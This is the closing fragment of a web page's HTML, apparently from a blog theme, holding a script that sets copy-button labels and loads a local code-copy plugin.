    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
